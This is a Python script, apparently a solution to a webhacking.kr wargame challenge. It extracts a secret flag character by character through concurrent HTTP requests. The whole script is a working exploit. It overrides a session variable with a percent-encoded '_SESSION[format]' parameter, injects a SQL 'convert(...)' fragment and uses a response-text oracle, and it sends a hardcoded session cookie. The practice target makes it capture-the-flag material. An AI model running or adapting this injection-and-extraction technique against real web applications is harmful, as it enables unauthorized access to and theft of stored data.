import asyncio
import aiohttp
from yarl import URL

def encode_all(string):
    return "".join("%{0:0>2x}".format(ord(char)) for char in string)

URL_BASE = "http://webhacking.kr:10016/"
SESS_ID = "jl75lgpfhd5tibe80ebtki2b"

semaphore = asyncio.Semaphore(5)  # Limit concurrent requests

async def fetch(session, payload):
    async with semaphore:
        # Fully encode the key name _SESSION[format]
        encoded_key = encode_all("_SESSION[format]")  # This will be percent-encoded key

        # Construct raw query string manually
        query_string = (
            f"{encoded_key}=convert(%s,char({len(payload)}))"
            f"&column=secret&keyword={payload}"
        )

        url = URL(f"{URL_BASE}?{query_string}", encoded=True)

        timeout = aiohttp.ClientTimeout(total=10)
        try:
            async with session.get(url, timeout=timeout, cookies={"PHPSESSID": SESS_ID}) as response:
                text = await response.text()
                # print("URL:", response.url)
                # print(f"Status: {response.status} | Payload: {payload}")
                return text
        except asyncio.TimeoutError:
            return "timeout"

async def main():
    secret = ""
    character_set = "_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}-?"  # Custom char set

    async with aiohttp.ClientSession() as session:
        while not secret.endswith("}"):
            tasks = []
            for c in character_set:
                payload = secret + c
                tasks.append(fetch(session, payload))

            responses = await asyncio.gather(*tasks)

            for index, response in enumerate(responses):
                if "Search 1!" in response:
                    secret += character_set[index]
                    print(f"Found char: {character_set[index]} => {secret}")
                    break
            else:
                print("No character matched. Breaking.")
                break

if __name__ == "__main__":
    asyncio.run(main())
